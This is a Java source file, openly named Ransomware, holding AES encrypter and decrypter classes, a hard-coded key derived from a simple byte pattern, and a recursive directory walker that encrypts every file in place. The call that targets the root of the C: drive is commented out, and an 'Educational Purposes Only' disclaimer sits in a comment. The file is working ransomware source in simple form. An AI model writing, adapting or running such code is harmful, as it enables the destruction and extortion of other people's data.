
import java.io.File;
import javax.crypto.Cipher;
import javax.crypto.spec.SecretKeySpec;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.nio.file.StandardOpenOption;



public class Ransomware {
    public void run(){
        //Example:
            Encrypter encrypter = new Encrypter();
            Decrypter decrypter = new Decrypter();
            byte[] key = get_key();
            encrypter.run("file.txt", key);
            decrypter.run("file.txt", key);

        /*
         * Do not use if you don't know what you're doing.
         * I strongly recommend that you do not run this code.
         * Educational Purposes Only.
         * I take no responsibility how you use this.
         * NO SUPPORT.
         */

        //String directoryPath = "C:\\\\";
        //walkDirectory(new File(directoryPath));
    }
        public static byte[] get_key(){
        byte[] keyBytes = new byte[32];
        for (int i  = 0; i < 32; i ++){
            //encryption key algorithm
            keyBytes[i] = (byte) (i*2);
            System.out.println("byte arr values: " +(byte) (i * 2));
        }
        return keyBytes;
    }

    public static void walkDirectory(File directory) {
        File[] files = directory.listFiles();
        Encrypter encrypter = new Encrypter();

        if (files != null) {
            for (File file : files) {
                if (file.isDirectory()) {
                    walkDirectory(file);
                } else {
                    //encryption(file.getAbsolutePath())
                    encrypter.run(file.getAbsolutePath(), get_key());
                    System.out.println(file.getAbsolutePath());
                }
            }
        }
    }
}


class Encrypter{

    public void run(String inputFile, byte[] key){
        byte[] keyBytes = key;

        try {
            byte[] inputBytes = Files.readAllBytes(Paths.get(inputFile));
            byte[] encryptedBytes = encrypt(inputBytes, keyBytes);
            Files.write(Paths.get(inputFile), encryptedBytes, StandardOpenOption.CREATE);
            System.out.println("File encrypted successfully.");

        } catch (Exception e) {
            e.printStackTrace();
        }


    }



    public byte [] encrypt(byte[] inputBytes, byte[] keyBytes) throws Exception{

        SecretKeySpec secretKey = new SecretKeySpec(keyBytes,"AES");
        Cipher cipher = Cipher.getInstance("AES");
        cipher.init(Cipher.ENCRYPT_MODE, secretKey);
        System.out.println(keyBytes.toString());
        return cipher.doFinal(inputBytes);
    }

}



class Decrypter{
    public void run(String inputFile, byte[] key){
        byte[] keyBytes = key;

        try {
            byte[] inputBytes = Files.readAllBytes(Paths.get(inputFile));
            byte[] encryptedBytes = decrypt(inputBytes, keyBytes);
            Files.write(Paths.get(inputFile), encryptedBytes, StandardOpenOption.CREATE);
            System.out.println("File decrypted successfully.");

        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public byte [] decrypt(byte[] inputBytes, byte[] keyBytes) throws Exception{

        SecretKeySpec secretKey = new SecretKeySpec(keyBytes,"AES");
        Cipher cipher = Cipher.getInstance("AES");
        cipher.init(Cipher.DECRYPT_MODE, secretKey);
        System.out.println(keyBytes.toString());
        return cipher.doFinal(inputBytes);

    }
}
